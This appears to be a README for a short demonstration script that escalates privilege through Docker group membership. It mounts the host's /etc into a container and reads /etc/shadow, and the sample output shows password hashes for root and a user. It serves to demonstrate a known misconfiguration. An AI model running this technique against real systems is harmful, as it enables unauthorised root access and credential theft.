# docker-privilege-escalation
A docker example for privilege escalation

## How ?

If the user using docker is in the group docker he can run container with host mounted volumes. In this case, the user can run a light container with /etc mounted in and then get root access in the container.

The following example show how to read /etc/shadow from host with the help of a docker container and a user in group docker.

But as explained in the Docker security documentation: ```only trusted users should be allowed to control your Docker daemon```.

## Usage

* ``` chmod +x docker-escalate.sh```
* ``` ./docker-escalate.sh```


### Success
```
user@test:$ ./docker-escalate.sh 
User user in docker group, attacking...
root:$6$QHOCMH......................kh4A1Dx6sASl/BM0L/:16514:0:99999:7:::
daemon:*:16514:0:99999:7:::
bin:*:16514:0:99999:7:::
sys:*:16514:0:99999:7:::
sync:*:16514:0:99999:7:::
games:*:16514:0:99999:7:::
man:*:16514:0:99999:7:::
lp:*:16514:0:99999:7:::
mail:*:16514:0:99999:7:::
news:*:16514:0:99999:7:::
uucp:*:16514:0:99999:7:::
proxy:*:16514:0:99999:7:::
www-data:*:16514:0:99999:7:::
backup:*:16514:0:99999:7:::
list:*:16514:0:99999:7:::
irc:*:16514:0:99999:7:::
gnats:*:16514:0:99999:7:::
nobody:*:16514:0:99999:7:::
libuuid:!:16514:0:99999:7:::
syslog:*:16514:0:99999:7:::
user:$6$QHOCMHim$f9FEVV7/.TnxLsT5Wt14DTE5Qo8iCwPFjGAyYUH4vZQUawOKrlcXffrl2.ZLmA.fubLXkh4A1Dx6sASl/BM0L/:16540:0:99999:7:::
```

### Fail

```
user@user:$ ./docker-escalate.sh 
User test not in docker group, abort.
```